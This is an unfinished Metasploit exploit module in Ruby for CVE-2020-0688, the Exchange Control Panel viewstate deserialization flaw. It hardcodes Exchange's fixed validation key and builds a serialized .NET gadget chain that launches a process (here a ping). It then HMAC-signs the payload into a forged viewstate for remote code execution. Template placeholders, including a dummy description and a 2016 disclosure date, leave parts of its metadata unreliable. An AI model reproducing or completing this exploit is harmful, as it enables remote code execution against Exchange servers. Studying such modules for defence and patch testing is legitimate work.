##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  # include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  # include Msf::Exploit::CmdStager

  VALIDATION_KEY = "\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf"

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Exchange Control Panel Viewstate Deserialization',
        'Description'    => %q{
        Template description.
      },
        'Author'         => 'Spencer McIntyre',
        'License'        => MSF_LICENSE,
        'References'     => [
            ['CVE', 'CVE-2020-0688'],
            ['URL', 'https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'],
        # https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
        # https://github.com/Ridter/cve-2020-0688
        # https://github.com/microsoft/referencesource/blob/master/System.Web/Configuration/MachineKeySection.cs
        ],
        'Platform'       => 'win',
        'Arch'           => ARCH_X86,
        'Targets'        =>
            [
                [ 'Windows',   {  } ],
            ],
        'DefaultTarget'  => 0,
        'Privileged'     => true,
        'DisclosureDate' => 'Jan 1 2016'))

    register_options(
        [
            OptString.new('USERNAME', [ false,  "String Description", 'default value' ]),
            OptString.new('PASSWORD', [ false,  "String Description", 'default value' ]),
        ], self.class)
  end

  def check
    # return Exploit::CheckCode::Unknown
    # return Exploit::CheckCode::Safe
    # return Exploit::CheckCode::Detected
    # return Exploit::CheckCode::Appears
    # return Exploit::CheckCode::Vulnerable
    # return Exploit::CheckCode::Unsupported
  end

  def generate_viewstate
    # LosFormatted
    # check and see if this can be minified
    # generated with: ysoserial.exe -g TextFormattingRunProperties -c "ping 192.168.159.128" -f LosFormatter
    #                    \xc2 is some kinda size
    formatted =  "\xff\x012\xbb\x06\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x0c\x02\x00\x00\x00"
    formatted << "^Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    formatted << "\x05\x01\x00\x00\x00BMicrosoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"
    formatted << "\x01\x00\x00\x00\x0fForegroundBrush"
    formatted << "\x01\x02\x00\x00\x00\x06\x03\x00\x00\x00\xdd\x04"
    formatted << "<ResourceDictionary\r\n  xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\r\n"
    formatted << "  xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\r\n"
    formatted << "  xmlns:System=\"clr-namespace:System;assembly=mscorlib\"\r\n"
    formatted << "  xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">\r\n"
    formatted << "\t <ObjectDataProvider x:Key=\"\" ObjectType = \"{ x:Type Diag:Process}\" MethodName = \"Start\" >\r\n"
    formatted << "     <ObjectDataProvider.MethodParameters>\r\n"
    formatted << "        <System:String>ping</System:String>\r\n"
    formatted << "        <System:String>\"192.168.159.128\" </System:String>\r\n"
    formatted << "     </ObjectDataProvider.MethodParameters>\r\n"
    formatted << "    </ObjectDataProvider>\r\n"
    formatted << "</ResourceDictionary>\x0b"

    # todo: the viewstate generator here should be dynamic (get it from the page)
    # todo: ~~ notice the 1st (viewstate generator) hardcoded value is reversed ~~~
    mac_key_bytes = Rex::Text.hex_to_raw('274e7bb9') + Rex::Text.to_unicode("5aa59da4-6829-4f2a-a0e0-6fd148154bb7")
    print_status("mac key bytes length: #{mac_key_bytes.length}")

    signature = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), VALIDATION_KEY, formatted + mac_key_bytes)
    return Rex::Text.encode_base64(formatted + signature)
  end

  def exploit
    # web request example
    # requires Msf::Exploit::Remote::HttpClient
    # https://rapid7.github.io/metasploit-framework/api/Rex/Proto/Http/Client.html#request_cgi-instance_method
    # if raw required https://rapid7.github.io/metasploit-framework/api/Rex/Proto/Http/Client.html#request_raw-instance_method
    # res = ClientRequest https://rapid7.github.io/metasploit-framework/api/Rex/Proto/Http/ClientRequest.html


    generate_viewstate
  end
end
